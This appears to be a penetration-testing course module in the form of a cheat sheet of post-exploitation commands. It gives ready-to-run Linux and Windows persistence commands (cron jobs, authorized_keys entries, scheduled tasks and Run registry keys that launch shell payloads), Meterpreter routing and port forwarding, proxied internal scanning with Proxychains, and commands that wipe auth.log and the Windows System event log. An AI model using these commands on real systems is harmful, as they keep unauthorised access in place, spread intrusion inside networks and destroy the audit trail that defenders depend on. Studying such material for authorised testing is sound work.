# Module 15: Post-Exploitation Commands

### 1. Persistence Commands
| OS | Method | Command |
| :--- | :--- | :--- |
| **Linux** | Cron Job | `(crontab -l ; echo "* * * * * /tmp/shell.sh") | crontab -` |
| **Linux** | SSH Key | `echo "ssh-rsa AAA..." >> ~/.ssh/authorized_keys` |
| **Windows** | Scheduled Task | `schtasks /create /sc hourly /tn "Update" /tr "C:\temp\shell.exe"` |
| **Windows** | Registry | `reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "C:\temp\shell.exe"` |

### 2. Pivoting with Meterpreter
If you have a Meterpreter session:
- **Start a Route**: `route add 10.10.20.0 255.255.255.0 1` (Tells MSF to route traffic for the 10.10.20.x network through session 1).
- **Port Forward**: `portfwd add -l 8080 -p 80 -r 10.10.20.5` (Maps your local port 8080 to port 80 on internal machine 10.10.20.5).

### 3. Advanced Pivoting Tools
| Tool | Description | Use Case |
| :--- | :--- | :--- |
| **Chisel** | Fast TCP/UDP tunnel | Creating a SOCKS5 proxy via HTTP. |
| **Ligolo-ng** | Tunneling tool | Creating a virtual network interface on Kali. |
| **Proxychains** | Tool to chain proxies | Running Nmap through a SOCKS proxy. |

**Using Proxychains:**
Edit `/etc/proxychains4.conf` to add `socks5 127.0.0.1 1080`, then run:
`proxychains nmap -sT -Pn 10.10.20.5`

### 4. Clearing Tracks
- **Linux**: `echo "" > /var/log/auth.log`
- **Windows**: `wevtutil cl System` (Clear System logs).
